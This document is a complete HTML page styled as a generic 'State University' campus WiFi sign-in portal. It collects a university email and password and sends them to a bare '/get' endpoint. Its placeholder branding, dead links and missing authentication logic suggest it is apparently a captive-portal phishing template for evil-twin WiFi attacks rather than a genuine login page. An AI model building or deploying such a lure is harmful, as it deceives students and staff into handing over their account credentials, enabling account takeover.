<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>State University — Campus WiFi</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:420px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 4px 30px rgba(0,0,0,0.08)}
.top{background:#1a1a2e;padding:0}
.top-inner{padding:24px 28px 20px;display:flex;align-items:center;gap:14px}
.seal{width:46px;height:46px;background:rgba(255,255,255,0.08);border-radius:50%;border:2px solid rgba(255,255,255,0.15);display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:20px}
.top-text .uni-name{font-size:14px;font-weight:700;color:#fff;letter-spacing:0.3px}
.top-text .uni-sub{font-size:10px;color:rgba(255,255,255,0.45);margin-top:3px}
.gold-bar{height:3px;background:linear-gradient(90deg,#C4A050,#e8c870,#C4A050)}
.ssid-row{background:#f8f8f8;border-bottom:1px solid #eee;padding:7px 28px;display:flex;align-items:center;gap:8px}
.dot{width:6px;height:6px;background:#4ade80;border-radius:50%}
.ssid-row span{font-size:11px;color:#aaa}
.ssid-row strong{color:#1a1a2e;font-weight:600}
.body{padding:24px 28px 20px}
h2{font-size:17px;font-weight:700;color:#1a1a2e;margin-bottom:3px}
.sub{font-size:12.5px;color:#aaa;margin-bottom:18px}
.lbl{display:block;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:1.2px;color:#aaa;margin-bottom:7px;margin-top:18px}
input{width:100%;padding:12px 14px;border:1.5px solid #eee;border-radius:8px;font-size:14.5px;background:#fafafa;color:#1a1a2e}
input:focus{outline:none;border-color:#1a1a2e;box-shadow:0 0 0 3px rgba(26,26,46,0.07)}
input::placeholder{color:#ddd}
.btn{width:100%;padding:13px;margin-top:20px;border:none;border-radius:8px;background:#1a1a2e;color:#C4A050;font-size:13px;font-weight:700;letter-spacing:0.3px;cursor:pointer}
.forgot{display:block;text-align:right;font-size:11.5px;color:#C4A050;text-decoration:none;margin-top:8px}
.terms{font-size:11px;color:#ccc;text-align:center;margin-top:14px;line-height:1.6}
.terms a{color:#1a1a2e}
.foot{background:#f8f8f8;border-top:1px solid #eee;padding:12px 28px;display:flex;justify-content:space-between}
.foot span,.foot a{font-size:10.5px;color:#ccc;text-decoration:none}
.foot a{color:#C4A050}
</style>
</head>
<body>
<div class="card">
  <div class="top">
    <div class="top-inner">
      <div class="seal">🎓</div>
      <div class="top-text">
        <div class="uni-name">State University</div>
        <div class="uni-sub">Campus Network Portal</div>
      </div>
    </div>
    <div class="gold-bar"></div>
  </div>
  <div class="ssid-row"><div class="dot"></div><span>Network: <strong>SU-SecureWiFi</strong></span></div>
  <div class="body">
    <h2>Campus Network Sign In</h2>
    <p class="sub">Use your university credentials to access the campus network.</p>
    <form action="/get">
      <label class="lbl">University Email</label>
      <input name="email" type="text" placeholder="netid@stateuniversity.edu" required>
      <label class="lbl">Password</label>
      <input name="password" type="password" placeholder="Enter your password" required>
      <button type="submit" class="btn">Sign In to Network</button>
      <a href="#" class="forgot">Forgot password?</a>
      <p class="terms">By connecting you agree to the university's <a href="#">Acceptable Use Policy</a>.</p>
    </form>
  </div>
  <div class="foot"><span>&copy; State University IT Services</span><a href="#">Help Desk</a></div>
</div>
</body>
</html>
